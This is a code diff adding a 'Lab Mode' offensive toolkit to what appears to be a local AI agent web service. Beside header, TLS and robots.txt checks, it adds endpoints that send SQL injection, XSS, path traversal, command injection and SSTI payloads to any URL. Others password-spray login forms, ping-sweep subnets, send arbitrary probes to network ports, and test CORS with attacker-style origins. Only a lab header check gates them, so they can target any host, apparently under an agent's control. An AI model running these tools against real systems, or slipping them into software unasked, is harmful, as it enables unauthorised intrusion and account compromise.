@@ -3718,6 +3718,245 @@ def labmode_login_probe(req: dict, request: Request):
         return {"status": getattr(e,"code",0), "error": str(e), "likely_success": False, "snippet": ""}
 
 
+# ── Lab Mode: extended offensive toolkit (gated) ─────────────────────
+
+import ssl as _kssl
+import re as _kre
+
+@app.post("/labmode/headers")
+def labmode_headers(req: dict, request: Request):
+    """Inspect HTTP security headers, server banner, cookies."""
+    _require_lab(dict(request.headers))
+    url = (req.get("url") or "").strip()
+    if not url.startswith("http"):
+        raise HTTPException(status_code=400, detail="url must start with http(s)://")
+    method = (req.get("method") or "GET").upper()
+    try:
+        r = _kreq.Request(url, method=method, headers={"User-Agent":"AgentLab/1.0"})
+        with _kreq.urlopen(r, timeout=8) as resp:
+            headers = {k: v for k, v in resp.getheaders()}
+            body = resp.read(4096).decode("utf-8","replace")
+            status = resp.status
+            final_url = resp.url
+    except Exception as e:
+        return {"error": str(e), "status": getattr(e,"code",0)}
+    sec = ["Strict-Transport-Security","Content-Security-Policy","X-Frame-Options","X-Content-Type-Options","Referrer-Policy","Permissions-Policy","X-XSS-Protection"]
+    missing = [h for h in sec if h not in headers]
+    findings = []
+    if missing:
+        findings.append({"level":"warn","title":"Missing security headers","detail":", ".join(missing)})
+    if "Server" in headers:
+        findings.append({"level":"info","title":"Server banner","detail":headers["Server"]})
+    if "X-Powered-By" in headers:
+        findings.append({"level":"warn","title":"Tech leak","detail":headers["X-Powered-By"]})
+    cookies = headers.get("Set-Cookie","")
+    if cookies and "HttpOnly" not in cookies:
+        findings.append({"level":"warn","title":"Cookie missing HttpOnly","detail":cookies[:200]})
+    if cookies and "Secure" not in cookies and url.startswith("https"):
+        findings.append({"level":"warn","title":"Cookie missing Secure","detail":cookies[:200]})
+    return {"url": url, "final_url": final_url, "status": status, "headers": headers, "findings": findings, "body_preview": body[:600]}
+
+
+@app.post("/labmode/ssl")
+def labmode_ssl(req: dict, request: Request):
+    """Inspect TLS certificate of host:port."""
+    _require_lab(dict(request.headers))
+    host = (req.get("host") or "").strip()
+    port = int(req.get("port") or 443)
+    if not host:
+        raise HTTPException(status_code=400, detail="host required")
+    ctx = _kssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _kssl.CERT_NONE
+    try:
+        with _ks.create_connection((host, port), timeout=6) as sock:
+            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
+                der = ssock.getpeercert(True)
+                pem = _kssl.DER_cert_to_PEM_cert(der)
+                cert_dict = ssock.getpeercert() or {}
+                cipher = ssock.cipher()
+                version = ssock.version()
+        return {"host": host, "port": port, "tls_version": version, "cipher": cipher, "cert": cert_dict, "pem_preview": pem[:500]}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+@app.post("/labmode/vuln_probe")
+def labmode_vuln_probe(req: dict, request: Request):
+    """Send harmless test payloads to a URL parameter and look for reflection / errors."""
+    _require_lab(dict(request.headers))
+    url = (req.get("url") or "").strip()
+    param = (req.get("param") or "q").strip()
+    if not url.startswith("http"):
+        raise HTTPException(status_code=400, detail="url must start with http(s)://")
+    payloads = {
+        "sqli_error":   "'\"",
+        "sqli_bool":    "' OR '1'='1",
+        "xss_reflect":  "<svg/onload=alert(1)>",
+        "lfi_unix":     "../../../../etc/passwd",
+        "lfi_win":      "..\\..\\..\\..\\windows\\win.ini",
+        "open_redirect":"//evil.example.com",
+        "cmd_inject":   ";id",
+        "ssti":         "{{7*7}}",
+    }
+    err_signs = ["sql syntax","mysql","ORA-","SQLite","psql:","Microsoft SQL","Warning: include","root:x:0:0","[extensions]","stack trace","Traceback"]
+    results = []
+    for name, p in payloads.items():
+        sep = "&" if "?" in url else "?"
+        full = f"{url}{sep}{_kparse.quote(param)}={_kparse.quote(p)}"
+        try:
+            r = _kreq.Request(full, headers={"User-Agent":"AgentLab/1.0"})
+            with _kreq.urlopen(r, timeout=6) as resp:
+                body = resp.read(16384).decode("utf-8","replace")
+                status = resp.status
+        except Exception as e:
+            body = ""; status = getattr(e,"code",0)
+        reflected = p in body
+        err_hit = next((s for s in err_signs if s.lower() in body.lower()), None)
+        ssti_eval = (name=="ssti" and "49" in body and p not in body)
+        suspicious = bool(reflected or err_hit or ssti_eval)
+        results.append({"payload": name, "value": p, "status": status, "reflected": reflected, "error_signature": err_hit, "ssti_eval": ssti_eval, "suspicious": suspicious})
+    return {"url": url, "param": param, "results": results}
+
+
+@app.post("/labmode/host_sweep")
+def labmode_host_sweep(req: dict, request: Request):
+    """Ping-sweep a CIDR to find live hosts on your LAN."""
+    _require_lab(dict(request.headers))
+    cidr = (req.get("cidr") or "").strip()
+    try:
+        net = _kip.ip_network(cidr, strict=False)
+    except Exception:
+        raise HTTPException(status_code=400, detail="cidr required, e.g. 192.168.1.0/24")
+    if net.num_addresses > 512:
+        raise HTTPException(status_code=400, detail="network too large (max /23)")
+    is_win = platform.system().lower().startswith("win")
+    flag = "-n" if is_win else "-c"
+    def ping(ip):
+        try:
+            r = subprocess.run(["ping", flag, "1", "-w" if is_win else "-W", "500" if is_win else "1", str(ip)],
+                               capture_output=True, timeout=3)
+            if r.returncode == 0:
+                try: name = _ks.gethostbyaddr(str(ip))[0]
+                except Exception: name = ""
+                return {"ip": str(ip), "hostname": name}
+        except Exception:
+            return None
+    hosts = []
+    with _kcf.ThreadPoolExecutor(max_workers=64) as ex:
+        for r in ex.map(ping, list(net.hosts())):
+            if r: hosts.append(r)
+    return {"cidr": cidr, "scanned": net.num_addresses, "alive": hosts}
+
+
+@app.post("/labmode/banner")
+def labmode_banner(req: dict, request: Request):
+    """Connect to host:port, optionally send a probe, return banner."""
+    _require_lab(dict(request.headers))
+    host = (req.get("host") or "").strip()
+    port = int(req.get("port") or 0)
+    probe = req.get("probe") or ""
+    if not host or not port:
+        raise HTTPException(status_code=400, detail="host and port required")
+    try:
+        s = _ks.create_connection((host, port), timeout=4)
+        s.settimeout(3)
+        if probe:
+            s.sendall(probe.encode() if isinstance(probe,str) else probe)
+        data = b""
+        try:
+            for _ in range(3):
+                chunk = s.recv(2048)
+                if not chunk: break
+                data += chunk
+                if len(data) > 4096: break
+        except _ks.timeout:
+            pass
+        s.close()
+        text = data.decode("utf-8","replace")
+        return {"host": host, "port": port, "bytes": len(data), "banner": text[:2000]}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+@app.post("/labmode/spray")
+def labmode_spray(req: dict, request: Request):
+    """Try a list of usernames with a single password against an HTTP form. Rate-limited."""
+    _require_lab(dict(request.headers))
+    url = (req.get("url") or "").strip()
+    user_field = req.get("user_field") or "username"
+    pass_field = req.get("pass_field") or "password"
+    users = [u.strip() for u in (req.get("usernames") or []) if u.strip()][:20]
+    password = req.get("password") or ""
+    fail_text = req.get("fail_text") or ""
+    delay = float(req.get("delay") or 1.5)
+    if not url.startswith("http") or not users:
+        raise HTTPException(status_code=400, detail="url and usernames[] required")
+    results = []
+    for u in users:
+        time.sleep(delay)
+        data = _kparse.urlencode({user_field: u, pass_field: password}).encode()
+        try:
+            r = _kreq.Request(url, data=data, headers={"User-Agent":"AgentLab/1.0","Content-Type":"application/x-www-form-urlencoded"})
+            with _kreq.urlopen(r, timeout=10) as resp:
+                body = resp.read(4096).decode("utf-8","replace")
+                ok = (fail_text not in body) if fail_text else (resp.status in (200, 302))
+                results.append({"user": u, "status": resp.status, "likely_success": bool(ok)})
+        except Exception as e:
+            results.append({"user": u, "status": getattr(e,"code",0), "error": str(e), "likely_success": False})
+    hits = [r for r in results if r.get("likely_success")]
+    return {"url": url, "tried": len(users), "hits": hits, "results": results}
+
+
+@app.post("/labmode/robots")
+def labmode_robots(req: dict, request: Request):
+    """Fetch robots.txt + sitemap.xml and list disclosed paths."""
+    _require_lab(dict(request.headers))
+    base = (req.get("base_url") or "").rstrip("/")
+    if not base.startswith("http"):
+        raise HTTPException(status_code=400, detail="base_url must start with http(s)://")
+    out = {"base_url": base, "robots": "", "sitemap_urls": [], "disallow": [], "allow": []}
+    try:
+        with _kreq.urlopen(f"{base}/robots.txt", timeout=6) as r:
+            out["robots"] = r.read(8192).decode("utf-8","replace")
+            for line in out["robots"].splitlines():
+                if line.lower().startswith("disallow:"): out["disallow"].append(line.split(":",1)[1].strip())
+                elif line.lower().startswith("allow:"): out["allow"].append(line.split(":",1)[1].strip())
+                elif line.lower().startswith("sitemap:"): out["sitemap_urls"].append(line.split(":",1)[1].strip())
+    except Exception as e:
+        out["robots_error"] = str(e)
+    try:
+        with _kreq.urlopen(f"{base}/sitemap.xml", timeout=6) as r:
+            sm = r.read(65536).decode("utf-8","replace")
+            out["sitemap_locs"] = _kre.findall(r"<loc>([^<]+)</loc>", sm)[:200]
+    except Exception:
+        pass
+    return out
+
+
+@app.post("/labmode/cors")
+def labmode_cors(req: dict, request: Request):
+    """Send Origin headers and check Access-Control-Allow-Origin reflection."""
+    _require_lab(dict(request.headers))
+    url = (req.get("url") or "").strip()
+    if not url.startswith("http"):
+        raise HTTPException(status_code=400, detail="url required")
+    origins = ["https://evil.example.com","null","https://" + (_urlparse(url).hostname or "x") + ".evil.com"]
+    results = []
+    for o in origins:
+        try:
+            r = _kreq.Request(url, headers={"User-Agent":"AgentLab/1.0","Origin":o})
+            with _kreq.urlopen(r, timeout=6) as resp:
+                acao = resp.headers.get("Access-Control-Allow-Origin","")
+                acac = resp.headers.get("Access-Control-Allow-Credentials","")
+                vuln = (acao == o) or acao == "*"
+                results.append({"origin": o, "acao": acao, "acac": acac, "vulnerable": bool(vuln)})
+        except Exception as e:
+            results.append({"origin": o, "error": str(e)})
+    return {"url": url, "results": results}
+
+
+
     parser = argparse.ArgumentParser(description="Local AI Agent")
     parser.add_argument("--telegram-token", help="Telegram bot token from @BotFather")
     parser.add_argument("--model", default="gemma3:4b", help="Ollama model to use (default: gemma3:4b)")
